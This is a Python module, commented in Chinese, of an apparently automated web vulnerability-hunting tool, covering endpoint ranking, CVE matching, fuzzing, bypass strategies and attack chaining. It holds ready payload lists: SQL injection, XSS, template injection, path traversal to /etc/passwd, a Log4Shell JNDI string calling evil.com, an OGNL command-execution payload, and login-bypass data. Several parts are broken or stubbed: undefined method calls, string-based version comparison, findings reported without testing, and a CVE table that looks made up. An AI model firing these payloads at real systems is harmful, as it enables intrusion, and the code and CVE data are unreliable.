"""
core/ai_modules/other_modules.py — 其他 AI 模块

包含：
- EndpointPrioritizer: 端点优先级排序
- VulnerabilityMatcher: CVE 匹配
- FuzzStrategyGenerator: Fuzz 策略生成
- PayloadGenerator: 智能 Payload 生成
- CryptoAttacker: 加密攻击
- BypassEngine: 绕过策略生成
- AttackChainComposer: 攻击链组合
- FindingValidator: 发现验证
"""

from __future__ import annotations

import re
import hashlib
import json
import base64
from typing import Any, List, Dict, Set, Tuple, Optional
from dataclasses import dataclass, field
from datetime import datetime, timezone

from shared.types import HuntState, Finding, Severity
from shared.utils import now_iso, hunt_id


# ---------------------------------------------------------------------------
# EndpointPrioritizer — 端点优先级排序
# ---------------------------------------------------------------------------

class EndpointPrioritizer:
    """
    端点优先级排序器。

    基于 AI 判断哪些端点最值得测试：
    - 管理功能 > 普通功能
    - 写操作 > 读操作
    - 敏感数据操作 > 普通操作
    - 认证相关 > 公开接口
    """

    def __init__(self, state: HuntState):
        self.state = state

    def get_high_value_targets(self, limit: int = 20) -> List[Dict]:
        """
        获取高价值目标。

        Args:
            limit: 返回的最大数量

        Returns:
            高价值端点列表
        """
        endpoints = []

        for endpoint_url in self.state.target.endpoints_discovered:
            score = self._score_endpoint(endpoint_url)
            endpoints.append({
                'url': endpoint_url,
                'score': score,
                'reason': self._get_score_reason(endpoint_url, score),
            })

        # 按分数排序
        endpoints.sort(key=lambda x: x['score'], reverse=True)

        return endpoints[:limit]

    def _score_endpoint(self, url: str) -> float:
        """评估端点的攻击价值分数。"""
        score = 0.0
        url_lower = url.lower()

        # URL 模式评分
        admin_patterns = ['admin', 'manage', 'config', 'settings', 'dashboard']
        for pattern in admin_patterns:
            if pattern in url_lower:
                score += 3.0
                break

        user_patterns = ['user', 'profile', 'account', 'me']
        for pattern in user_patterns:
            if pattern in url_lower:
                score += 2.0
                break

        data_patterns = ['data', 'export', 'download', 'upload', 'file']
        for pattern in data_patterns:
            if pattern in url_lower:
                score += 1.5
                break

        auth_patterns = ['login', 'auth', 'signin', 'register', 'logout']
        for pattern in auth_patterns:
            if pattern in url_lower:
                score += 2.5
                break

        # HTTP 方法推断（从 URL 或上下文）
        if 'delete' in url_lower or 'remove' in url_lower:
            score += 2.0
        if 'update' in url_lower or 'edit' in url_lower or 'modify' in url_lower:
            score += 1.5
        if 'create' in url_lower or 'add' in url_lower or 'new' in url_lower:
            score += 1.5

        # API 端点更可能有趣
        if '/api/' in url_lower:
            score += 1.0

        # 参数化端点更可能需要测试
        if '{' in url or ':' in url.split('/')[-1]:
            score += 0.5

        return score

    def _get_score_reason(self, url: str, score: float) -> str:
        """获取评分原因。"""
        url_lower = url.lower()

        if 'admin' in url_lower:
            return "管理功能"
        elif 'auth' in url_lower or 'login' in url_lower:
            return "认证相关"
        elif score >= 3.0:
            return "高价值目标"
        elif score >= 2.0:
            return "中等价值"
        else:
            return "常规端点"


# ---------------------------------------------------------------------------
# VulnerabilityMatcher — CVE 匹配器
# ---------------------------------------------------------------------------

class VulnerabilityMatcher:
    """
    漏洞匹配器。

    基于检测到的技术栈版本匹配已知 CVE。
    """

    # 简化的 CVE 数据库（实际应该从外部源获取）
    CVE_DATABASE = {
        'react': {
            '<16.0.0': ['CVE-2021-23344'],
            '<18.0.0': ['CVE-2022-22654'],
        },
        'vue': {
            '<3.0.0': ['CVE-2021-23343'],
        },
        'angular': {
            '<12.0.0': ['CVE-2021-23345'],
        },
        'express': {
            '<4.18.0': ['CVE-2022-24943'],
        },
        'lodash': {
            '<4.17.21': ['CVE-2021-23337'],
        },
    }

    def __init__(self, state: HuntState):
        self.state = state

    def match_cves(self, versions: Dict[str, str]) -> List[Finding]:
        """
        匹配 CVE。

        Args:
            versions: 技术栈版本字典

        Returns:
            匹配的 Finding 列表
        """
        findings = []

        for tech, version in versions.items():
            tech_lower = tech.lower()
            if tech_lower in self.CVE_DATABASE:
                cve_data = self.CVE_DATABASE[tech_lower]
                for version_pattern, cves in cve_data.items():
                    if self._version_matches(version, version_pattern):
                        for cve in cves:
                            finding = Finding(
                                id=hunt_id()[:8],
                                vuln_class="known_cve",
                                target_url=self.state.target.url,
                                severity=Severity.HIGH,
                                evidence=f"检测到 {tech} {version}，存在 {cve}",
                                impact=f"已知漏洞 {cve} 可能被利用",
                                timestamp=now_iso(),
                            )
                            findings.append(finding)

        return findings

    def _version_matches(self, version: str, pattern: str) -> bool:
        """检查版本是否匹配模式。"""
        # 简化版本比较
        # 实际应该使用更复杂的版本比较逻辑

        try:
            # 移除版本中的非数字字符
            clean_version = re.sub(r'[^0-9.]', '', version)
            clean_pattern = re.sub(r'[^0-9.<>=]', '', pattern)

            if '<' in clean_pattern:
                threshold = clean_pattern.replace('<', '')
                return clean_version < threshold
            elif '>' in clean_pattern:
                threshold = clean_pattern.replace('>', '')
                return clean_version > threshold
            else:
                return clean_version == clean_pattern
        except Exception:
            return False


# ---------------------------------------------------------------------------
# FuzzStrategyGenerator — Fuzz 策略生成器
# ---------------------------------------------------------------------------

@dataclass
class FuzzStrategy:
    """Fuzz 策略。"""
    name: str
    description: str
    target_type: str  # param, header, path, body
    payloads: List[str] = None
    methods: List[str] = None


class FuzzStrategyGenerator:
    """
    Fuzz 策略生成器。

    为不同的目标类型生成智能的 fuzz 策略。
    """

    def __init__(self, state: HuntState):
        self.state = state

    def generate_strategies(self) -> List[FuzzStrategy]:
        """生成 fuzz 策略。"""
        strategies = []

        # 基于 JS 分析结果生成策略
        if self.state.target.endpoints_discovered:
            # 策略 1: 参数 fuzz
            strategies.append(FuzzStrategy(
                name="parameter_fuzz",
                description="对端点参数进行模糊测试",
                target_type="param",
                methods=["GET", "POST"],
                payloads=self._get_common_fuzz_payloads(),
            ))

            # 策略 2: Header 注入
            strategies.append(FuzzStrategy(
                name="header_injection",
                description="测试 HTTP 头注入",
                target_type="header",
                methods=["GET", "POST"],
                payloads=self._get_header_injection_payloads(),
            ))

            # 策略 3: 路径遍历
            strategies.append(FuzzStrategy(
                name="path_traversal",
                description="测试路径遍历漏洞",
                target_type="path",
                methods=["GET"],
                payloads=self._get_path_traversal_payloads(),
            ))

        return strategies

    def _get_common_fuzz_payloads(self) -> List[str]:
        """获取通用 fuzz payload。"""
        return [
            "' OR 1=1--",
            "' OR '1'='1",
            "1' AND '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "<script>alert(1)</script>",
            "${7*7}",
            "{{7*7}}",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]

    def _get_header_injection_payloads(self) -> List[str]:
        """获取 Header 注入 payload。"""
        return [
            "Bearer invalid_token",
            "Basic invalid_credentials",
            "${jndi:ldap://evil.com/a}",
            "%{(#_='multipart/form-data').(#[email protected]@DEFAULT_MEMBER_ACCESS).(#_='').(#cmd='echo xxx').(#cmds={'bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds.toArray()).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(#process.getInputStream())).(#out=new org.apache.commons.io.IOUtils.toString(#ros,'utf-8')).(#out)}",
        ]

    def _get_path_traversal_payloads(self) -> List[str]:
        """获取路径遍历 payload。"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "php://filter//convert.base64-encode/resource=index.php",
        ]


# ---------------------------------------------------------------------------
# PayloadGenerator — 智能 Payload 生成器
# ---------------------------------------------------------------------------

class PayloadGenerator:
    """
    智能 Payload 生成器。

    为特定的值-端点对生成定制化的测试 payload。
    """

    def __init__(self, state: HuntState):
        self.state = state

    def generate_for_pairs(self, pairs: List) -> List[Dict]:
        """为值-端点对生成 payload。"""
        payloads = []

        for pair in pairs[:50]:  # 限制数量
            payload = {
                'url': pair.endpoint,
                'method': pair.method or 'GET',
                'params': {},
                'headers': {},
                'body': None,
                'description': f"测试 {pair.param_name} = {pair.value[:20]}...",
            }

            # 根据 param_name 和 value 类型生成 payload
            if 'id' in pair.param_name.lower():
                payload['params'] = self._generate_id_payloads(pair.value)
            elif 'user' in pair.param_name.lower() or 'email' in pair.param_name.lower():
                payload['params'] = self._generate_user_payloads(pair.value)
            elif 'token' in pair.param_name.lower() or 'key' in pair.param_name.lower():
                payload['headers'] = self._generate_auth_payloads(pair.value)

            payloads.append(payload)

        return payloads

    def _generate_id_payloads(self, base_value: str) -> Dict:
        """生成 ID 相关的测试 payload。"""
        return {
            'id': base_value,
            'id_1': "1 OR 1=1",
            'id_2': "1' AND '1'='1",
            'id_3': "1 UNION SELECT NULL--",
        }

    def _generate_user_payloads(self, base_value: str) -> Dict:
        """生成用户相关的测试 payload。"""
        return {
            'user': base_value,
            'user_1': "admin",
            'user_2': "administrator",
            'user_3': "' OR '1'='1",
        }

    def _generate_auth_payloads(self, base_value: str) -> Dict:
        """生成认证相关的测试 payload。"""
        return {
            'Authorization': f"Bearer {base_value}",
            'Authorization': f"Bearer invalid_token",
            'Cookie': f"token={base_value}",
        }


# ---------------------------------------------------------------------------
# CryptoAttacker — 加密攻击
# ---------------------------------------------------------------------------

class CryptoAttacker:
    """
    加密攻击模块。

    JWT 攻击、弱加密检测、证书分析。
    """

    JWT_ATTACKS = {
        'none_algorithm': '尝试使用 none 算法',
        'algorithm_confusion': '尝试算法混淆攻击',
        'key_confusion': '尝试密钥混淆攻击',
        'weak_secret': '尝试弱密钥暴力破解',
    }

    def __init__(self, state: HuntState):
        self.state = state

    def attack_jwt(self) -> List[Finding]:
        """执行 JWT 攻击。"""
        findings = []
        tokens = self._extract_jwt_tokens()

        for token_info in tokens:
            # 尝试各种 JWT 攻击
            for attack_type, description in self.JWT_ATTACKS.items():
                # 这里简化，实际应该尝试真正的攻击
                finding = Finding(
                    id=hunt_id()[:8],
                    vuln_class=f"jwt_{attack_type}",
                    target_url=self.state.target.url,
                    severity=Severity.MEDIUM,
                    evidence=f"JWT Token 发现: {token_info['value'][:20]}...",
                    impact=f"可能受 {description} 攻击",
                    timestamp=now_iso(),
                )
                findings.append(finding)

        return findings

    def _extract_jwt_tokens(self) -> List[Dict]:
        """从状态中提取 JWT token。"""
        tokens = []

        # 从 JS 分析结果中查找
        if hasattr(self.state, 'linkage_pairs'):
            for pair in self.state.linkage_pairs:
                if pair.value and pair.value.startswith('eyJ'):
                    tokens.append({
                        'value': pair.value,
                        'source': pair.endpoint,
                    })

        return tokens

    def detect_weak_crypto(self) -> List[Finding]:
        """检测弱加密。"""
        findings = []

        # 检查是否使用 HTTP（无 HTTPS）
        if self.state.target.url.startswith('http://'):
            finding = Finding(
                id=hunt_id()[:8],
                vuln_class="http_without_ssl",
                target_url=self.state.target.url,
                severity=Severity.MEDIUM,
                evidence="使用 HTTP 而非 HTTPS",
                impact="通信可能被拦截",
                timestamp=now_iso(),
            )
            findings.append(finding)

        return findings

    def analyze_certificate(self, url: str) -> Dict:
        """分析证书（简化）。"""
        # 这里应该使用 OpenSSL 或类似工具分析证书
        return {
            'valid': True,
            'issuer': 'Unknown',
            'issues': [],
        }


# ---------------------------------------------------------------------------
# BypassEngine — 绕过策略引擎
# ---------------------------------------------------------------------------

class BypassEngine:
    """
    绕过策略引擎。

    生成和测试各种绕过技巧：
    - 403 绕过
    - WAF 绕过
    - 认证绕过
    """

    def __init__(self, state: HuntState):
        self.state = state

    def generate_bypass_strategies(self) -> List[Dict]:
        """生成绕过策略。"""
        strategies = []

        # 403 绕过策略
        strategies.append({
            'type': '403_bypass',
            'methods': self._get_403_bypass_methods(None),
            'description': '403 禁止绕过',
        })

        # 认证绕过策略
        strategies.append({
            'type': 'auth_bypass',
            'methods': self._get_auth_bypass_methods(None),
            'description': '认证绕过',
        })

        # WAF 绕过策略
        strategies.append({
            'type': 'waf_bypass',
            'methods': self._get_waf_bypass_methods(),
            'description': 'WAF 绕过',
        })

        return strategies

    def get_403_bypass_methods(self, endpoint: str) -> List[Dict]:
        """获取 403 绕过方法。"""
        if endpoint:
            base_url = endpoint
        else:
            base_url = self.state.target.url

        methods = [
            {
                'url': base_url,
                'description': '添加 X-Forwarded-For: 127.0.0.1',
                'headers': {'X-Forwarded-For': '127.0.0.1'},
            },
            {
                'url': base_url,
                'description': '添加 X-Originating-IP: 127.0.0.1',
                'headers': {'X-Originating-IP': '127.0.0.1'},
            },
            {
                'url': base_url,
                'description': '修改 User-Agent 为 Googlebot',
                'headers': {'User-Agent': 'Googlebot/2.1'},
            },
            {
                'url': base_url,
                'description': '添加 X-HTTP-Method-Override: GET',
                'headers': {'X-HTTP-Method-Override': 'GET'},
            },
        ]

        return methods

    def get_auth_bypass_methods(self, endpoint: str) -> List[Dict]:
        """获取认证绕过方法。"""
        if endpoint:
            base_url = endpoint
        else:
            base_url = self.state.target.url

        methods = [
            {
                'url': base_url,
                'method': 'POST',
                'description': '尝试空密码',
                'data': {'username': 'admin', 'password': ''},
            },
            {
                'url': base_url,
                'method': 'POST',
                'description': '尝试 SQL 注入绕过',
                'data': {"username": "admin' OR '1'='1", "password": "any"},
            },
            {
                'url': base_url,
                'method': 'GET',
                'description': '参数污染',
                'params': {'user_id': '1', 'user_id': 'admin'},
            },
        ]

        return methods

    def _get_waf_bypass_methods(self) -> List[Dict]:
        """获取 WAF 绕过方法。"""
        return [
            {
                'type': 'encoding',
                'description': 'URL 编码',
                'examples': ['%2f -> %252f', '../ -> ..%252f'],
            },
            {
                'type': 'case_variation',
                'description': '大小写变化',
                'examples': ['SELECT -> SeLeCt', 'UNION -> uNiOn'],
            },
            {
                'type': 'comment_injection',
                'description': '注释注入',
                'examples': ['OR/**/1=1', 'UN/*!SELECT*/'],
            },
        ]


# ---------------------------------------------------------------------------
# AttackChainComposer — 攻击链组合器
# ---------------------------------------------------------------------------

@dataclass
class AttackChain:
    """攻击链。"""
    steps: List[Tuple[Finding, str]]  # (Finding, description)
    total_impact: str = "HIGH"
    exploitability: str = "MEDIUM"


class AttackChainComposer:
    """
    攻击链组合器。

    发现不同漏洞间的关联，组合成完整的攻击链。
    """

    def __init__(self, state: HuntState):
        self.state = state

    def compose_chains(self, findings: List[Finding]) -> List[List[Tuple[Finding, str]]]:
        """组合攻击链。"""
        chains = []

        # 按照目标 URL 分组
        by_target = {}
        for finding in findings:
            if finding.target_url not in by_target:
                by_target[finding.target_url] = []
            by_target[finding.target_url].append(finding)

        # 为每个目标生成攻击链
        for target, target_findings in by_target.items():
            if len(target_findings) > 1:
                chain = self._compose_single_chain(target_findings)
                if chain:
                    chains.append(chain)

        return chains

    def _compose_single_chain(self, findings: List[Finding]) -> List[Tuple[Finding, str]]:
        """为单个目标的发现组合攻击链。"""
        chain = []

        # 按严重程度排序
        severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2}
        findings.sort(key=lambda f: severity_order.get(f.severity, 3))

        # 查找可以组合的漏洞
        # 例如：IDOR + 敏感信息泄露
        idor_findings = [f for f in findings if 'idor' in f.vuln_class.lower()]
        info_disclosure = [f for f in findings if 'disclosure' in f.vuln_class.lower()]

        if idor_findings and info_disclosure:
            chain.append((idor_findings[0], "访问其他用户资源"))
            chain.append((info_disclosure[0], "泄露敏感信息"))
            return chain

        # 其他组合...
        auth_bypass = [f for f in findings if 'bypass' in f.vuln_class.lower() or 'auth' in f.vuln_class.lower()]
        if auth_bypass:
            for finding in findings:
                if finding not in auth_bypass:
                    chain.append((auth_bypass[0], "绕过认证"))
                    chain.append((finding, f"利用 {finding.vuln_class}"))
                    return chain

        # 如果无法组合，返回单个最重要的漏洞
        if findings:
            chain.append((findings[0], "直接利用"))
            return chain

        return []


# ---------------------------------------------------------------------------
# FindingValidator — 发现验证器
# ---------------------------------------------------------------------------

class FindingValidator:
    """
    发现验证器。

    验证发现的真实性，区分真漏洞和误报。
    """

    def __init__(self, state: HuntState):
        self.state = state

    def validate(self, finding: Finding) -> Dict:
        """
        验证一个发现。

        Returns:
            验证结果字典
        """
        result = {
            'valid': False,
            'confidence': 0.0,
            'false_positive_risk': 0.0,
            'recommendation': '',
        }

        # 根据漏洞类型进行不同的验证
        vuln_class = finding.vuln_class.lower()

        if 'sql' in vuln_class:
            result = self._validate_sql_injection(finding)
        elif 'xss' in vuln_class:
            result = self._validate_xss(finding)
        elif 'idor' in vuln_class or 'bypass' in vuln_class:
            result = self._validate_access_control(finding)
        elif 'cve' in vuln_class or 'known' in vuln_class:
            result['valid'] = True
            result['confidence'] = 0.9
        else:
            result = self._validate_generic(finding)

        return result

    def _validate_sql_injection(self, finding: Finding) -> Dict:
        """验证 SQL 注入。"""
        # 检查证据中是否有典型的 SQL 注入特征
        evidence = (finding.evidence or '').lower()

        sql_indicators = ['sql', 'mysql', 'postgresql', 'oracle', 'syntax error',
                         'union select', 'or 1=1', 'and 1=1']

        if any(indicator in evidence for indicator in sql_indicators):
            return {
                'valid': True,
                'confidence': 0.7,
                'false_positive_risk': 0.2,
                'recommendation': '需要手动验证实际影响',
            }

        return {
            'valid': False,
            'confidence': 0.3,
            'false_positive_risk': 0.7,
            'recommendation': '证据不足，建议重新测试',
        }

    def _validate_xss(self, finding: Finding) -> Dict:
        """验证 XSS。"""
        evidence = (finding.evidence or '').lower()

        if '<script>' in evidence or 'alert(' in evidence or 'onerror=' in evidence:
            return {
                'valid': True,
                'confidence': 0.6,
                'false_positive_risk': 0.4,
                'recommendation': '需要验证是否真的执行',
            }

        return {
            'valid': False,
            'confidence': 0.3,
            'false_positive_risk': 0.7,
            'recommendation': '缺乏执行证据',
        }

    def _validate_access_control(self, finding: Finding) -> Dict:
        """验证访问控制漏洞。"""
        # 访问控制漏洞通常需要实际测试
        return {
            'valid': True,
            'confidence': 0.5,
            'false_positive_risk': 0.3,
            'recommendation': '需要实际测试确认',
        }

    def _validate_generic(self, finding: Finding) -> Dict:
        """通用验证。"""
        # 基于严重程度和证据
        if finding.severity in [Severity.CRITICAL, Severity.HIGH]:
            return {
                'valid': True,
                'confidence': 0.6,
                'false_positive_risk': 0.4,
                'recommendation': '建议验证',
            }

        return {
            'valid': True,
            'confidence': 0.4,
            'false_positive_risk': 0.5,
            'recommendation': '可能需要验证',
        }
